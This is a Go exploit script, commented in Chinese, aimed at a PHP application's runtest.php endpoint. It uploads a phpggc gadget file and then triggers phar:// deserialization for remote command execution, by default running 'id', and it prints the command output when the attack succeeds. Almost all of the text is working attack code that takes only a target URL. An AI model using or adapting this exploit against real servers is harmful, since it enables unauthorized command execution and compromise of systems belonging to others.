package main

import (
	"bytes"
	"flag"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"mime/multipart"
	"net/http"
	"net/http/cookiejar"
	"os"
	"regexp"
)

func exp(target string) string {
	jar, _ := cookiejar.New(nil)
	client := &http.Client{Jar: jar}
	// 写入文件
	filepath := "phpggc/testinfo.ini"
	content, _ := os.ReadFile(filepath)
	body1 := &bytes.Buffer{}
	writer1 := multipart.NewWriter(body1)
	writer1.WriteField("rkey", "gadget")
	writer1.WriteField("ini", string(content))
	defer writer1.Close()
	req1, err := http.NewRequest("POST", target+"runtest.php", body1)
	if err != nil {
		panic(err)
	}
	req1.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36")
	req1.Header.Set("Content-Type", writer1.FormDataContentType())
	client.Do(req1)
	// 触发反序列化
	body2 := &bytes.Buffer{}
	writer2 := multipart.NewWriter(body2)
	writer2.WriteField("rkey", "phar:///var/www/html/results/gadget./testinfo.ini/foo")
	defer writer2.Close()
	req2, err := http.NewRequest("POST", target+"runtest.php", body2)
	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36")
	req2.Header.Set("Content-Type", writer2.FormDataContentType())
	rep, _ := client.Do(req2)
	defer rep.Body.Close()
	result, _ := goquery.NewDocumentFromReader(rep.Body)
	reg, _ := regexp.MatchString(`later\."}?`, result.Text())
	if reg {
		return "发现漏洞，攻击结果如下:" + "\n" + result.Text()
	} else {
		return "未发现漏洞"
	}
}
func main() {
	var target string
	flag.StringVar(&target, "u", "", "指定url,默认执行命令为id")
	flag.Parse()
	fmt.Println(exp(target))
}
